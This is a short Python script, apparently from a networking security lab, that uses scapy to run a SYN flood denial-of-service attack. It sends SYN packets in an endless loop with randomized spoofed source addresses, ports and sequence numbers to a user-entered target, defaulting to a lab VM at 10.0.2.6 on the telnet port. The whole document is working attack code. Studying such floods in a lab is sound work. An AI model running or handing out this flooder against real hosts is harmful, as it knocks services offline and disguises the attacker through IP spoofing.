# writted by Ira Garrett 10/6/2025
"""
The purpose of this script is to make use of a SYN-ACK flooding attack. 
"""

# import libraries
from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits
import datetime


# syn_flood
"""
perform a syn flooding attack ont o a target ip and port\
target_ip -- the target ip address (string)
target_port -- the target port (string)
"""
def syn_flood(target_ip, target_port):

    # define the target IP address
    if(target_ip == ""):    ip = IP(dst="10.0.2.6") #10.0.2.6 is the IP address of the target VM
    else: ip = IP(dst=target_ip)
    
    # attach to target port; S flag is for SYN
    if target_port == "": tcp = TCP(dport=23, flags='S')  # attach to port 23 (which is telnet)
    else: tcp = TCP(dport=int(target_port), flags='S')  
    
    # combine IP and TCP layers into a single packet
    pkt = ip/tcp                   

    while True:
        pkt[IP].src = str(IPv4Address(getrandbits(32)))     # randomize source iP
        pkt[TCP].sport = getrandbits(16)                    # randomize source port
        pkt[TCP].seq = getrandbits(32)                      # randomize sequence number
        
        # send packet, with verbosity setting to 0 (verbose = 1 is default, showing when packet is sent)
        send(pkt, verbose = 0)      
        
        print(f"Attack sent at {datetime.datetime.now()}")



# main
if __name__ == "__main__":
    TARGET_IP = input("Please enter target IP address (leave blank for default 10.0.2.6):")
    TARGET_PORT = input("Please enter target port (leave blank for default port 23):")
    
    syn_flood(TARGET_IP,TARGET_PORT)